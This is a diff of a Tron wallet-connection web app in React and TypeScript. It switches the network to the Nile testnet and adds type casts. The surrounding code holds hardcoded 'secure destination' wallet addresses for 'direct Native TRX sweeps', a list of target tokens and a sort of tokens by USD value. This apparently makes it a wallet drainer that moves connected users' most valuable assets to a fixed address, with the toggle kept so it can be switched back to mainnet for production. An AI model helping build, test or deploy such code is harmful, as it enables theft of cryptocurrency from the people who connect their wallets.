@@ -11,6 +11,7 @@ import {
   useAppKitProvider
 } from '@reown/appkit/react'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
+// 🛠️ ADDED: Imported tronNile for testnet toggling
 import { tronMainnet, tronNile } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
@@ -24,17 +25,17 @@ import TronWeb from 'tronweb'
 // 🟢 ========================================================= 🟢
 // ── CONFIG & TOGGLE ──
 // Change to 'Nile' to test. Change back to 'Mainnet' for production.
-const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' // 🛠️ ADDED THIS BACK
-const NETWORK = 'Mainnet' 
+const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' 
+const NETWORK = 'Nile' 
 
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS_MAINNET = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
-const TRON_CONTRACT_ADDRESS_NILE = 'TCBjbz46uqhnhYoTo1msE8tDoV6hvgGqK2' // Put your Nile deployed contract here
+const TRON_CONTRACT_ADDRESS_NILE = 'TCBjbz46uqhnhYoTo1msE8tDoV6hvgGqK2' 
 
-const TRON_CONTRACT_ADDRESS = NETWORK === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
+// 🛠️ FIX: Cast as string to bypass TypeScript's strict literal prediction
+const TRON_CONTRACT_ADDRESS = (NETWORK as string) === 'Mainnet' ? TRON_CONTRACT_ADDRESS_MAINNET : TRON_CONTRACT_ADDRESS_NILE;
 
 // 💰 SECURE DESTINATION WALLETS
-// 🛠️ ADDED: Your dedicated Tron Cold Wallet for direct Native TRX sweeps
 const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
 // 🟢 ========================================================= 🟢
 
@@ -63,7 +64,8 @@ const TARGET_TOKENS: Record<string, any> = {
 };
 
 // 🛠️ DYNAMIC APPKIT NETWORK
-const activeNetwork = NETWORK === 'Mainnet' ? tronMainnet : tronNile;
+// 🛠️ FIX: Cast as string here as well
+const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
 
 const NETWORK_CONFIG = {
@@ -144,7 +146,6 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
-const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
